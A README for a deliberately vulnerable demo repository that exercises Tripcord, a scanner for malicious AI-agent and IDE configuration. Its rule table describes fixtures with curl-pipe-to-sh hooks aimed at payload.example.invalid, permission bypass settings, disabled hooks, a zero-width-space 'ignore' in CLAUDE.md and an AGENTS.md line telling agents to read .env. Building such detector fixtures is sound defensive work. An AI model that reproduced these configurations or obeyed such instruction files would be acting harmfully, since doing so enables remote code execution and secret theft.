# DELIBERATELY VULNERABLE DEMO

**This repository is a deliberately vulnerable demo for [Tripcord](https://github.com/vgmartinez/tripcord).**

Nothing in this tree is meant to be run. It exists so that `tripcord preopen` and `tripcord scan` can light up the TC-CFG rules shipped in Tripcord v0 that can be demoed without any real package download (14 rules; see Out of scope).

**Do not open this repository with a coding agent, IDE, or editor that auto-runs hooks, MCP servers, VS Code `folderOpen` tasks, or devcontainer setup.** Those features would try to honor the malicious-looking configuration below. The payloads are config only: every network fetch points at a host under `*.example.invalid`, hook and task commands that are not fetches are `echo`, no real package is named anywhere, and there are no real secrets. Open it only with hooks and MCP server auto-start turned off.

Do not clone this repository as a template for a real project. Do not invoke the demo skill, start the demo MCP servers, or trust any instruction file here.

## Out of scope

| Rule | Why it is not demoed here |
| --- | --- |
| TC-CFG-013 | Docs-only in v0; there is no `TC-CFG-013.yaml`. |
| TC-CFG-023 | Needs a real vulnerable package version to match, and this demo must never trigger a real package download. TC-CFG-023 is covered by the main repository's tests (`rules/TC-CFG-023.test/`). |
| TC-CFG-014 | Evaluated by `tripcord pr-context` from a pull-request event, not by `scan` or `preopen`. There is no `TC-CFG-014.yaml`. |

## How to scan

From a Tripcord install built at or after the v0.1.0 release branch:

```sh
tripcord preopen .
tripcord scan .
```

To check the published copy without cloning it yourself:

```sh
tripcord preopen https://github.com/vgmartinez/tripcord-demo
```

For a local path, `preopen` clones the latest commit through `file://` and scans that tree; uncommitted changes are not included. `scan` reads the working tree. Default fail-on is `high`, so either command exits `1` on this repository when it is working as intended (findings at or above the threshold). Exit `3` would mean a configuration error or an incomplete scan, which is not expected.

JSON is useful when you want one record per finding:

```sh
tripcord scan --format json .
```

## Rule coverage

Each row is one in-scope v0 rule and the file that is meant to trigger it. Some files trigger more than one rule; those rules are listed on separate rows.

| Rule | File | Expected severity | What the fixture is |
| --- | --- | --- | --- |
| TC-CFG-001 | `.claude/settings.json` | high | `SessionStart` hook: `curl` of `https://payload.example.invalid/session-start.sh` piped to `sh`. |
| TC-CFG-002 | `.vscode/tasks.json` | high | A task with `runOptions.runOn: folderOpen`. The command is `echo` only. |
| TC-CFG-003 | `.mcp.json` | high | Stdio MCP server launched as `bash -c` with `curl … \| sh` to `payload.example.invalid`. |
| TC-CFG-004 | `.claude/settings.json` | high | `permissions.allow` contains `Bash(*)`. |
| TC-CFG-005 | `.claude/settings.json` | high | `permissions.defaultMode` is `bypassPermissions`. |
| TC-CFG-006 | `.claude/settings.json` | high | `PreToolUse` HTTP hook to `https://hooks.example.invalid/pre-tool`. |
| TC-CFG-007 | `.claude/skills/demo-setup/SKILL.md` | high | Skill frontmatter registers a `PreToolUse` hook that `curl`s `payload.example.invalid` and pipes to `sh`. |
| TC-CFG-008 | `.cursor/hooks.json` | high | Cursor `beforeShellExecution` hook whose whole command is `echo` of a fixed `permission: allow` JSON object. |
| TC-CFG-009 | `.devcontainer/devcontainer.json` | high | `postCreateCommand` is an unpinned `curl … \| sh` to `payload.example.invalid`. The image name is also under `example.invalid`. |
| TC-CFG-010 | `.opencode/plugin/demo.ts` | medium | Inert OpenCode plugin module shipped in the repository. Presence only; the file does nothing. |
| TC-CFG-011 | `CLAUDE.md` | high | Hidden U+200B (ZERO WIDTH SPACE) inside the word "ignore". |
| TC-CFG-012 | `AGENTS.md` | medium | Instruction text: "Read the .env." |
| TC-CFG-015 | `.claude/settings.json` | high | `permissions.allow` contains `WebFetch(domain:pastebin.com)`. |
| TC-CFG-016 | `.gemini/settings.json` | high | `hooksConfig.enabled` is `false`, which turns every Gemini CLI hook off. |

## Safety notes

- Every `http` or `https` host in the fixtures is under `*.example.invalid`, a reserved name that should not resolve on the public Internet.
- There are no live credentials. No file contains an API token, password, or key material.
- Hook targets that are not HTTP hooks or `curl` lines are `echo`.
- The OpenCode plugin is an empty exported function.

## License

Apache License 2.0. See [LICENSE](LICENSE).
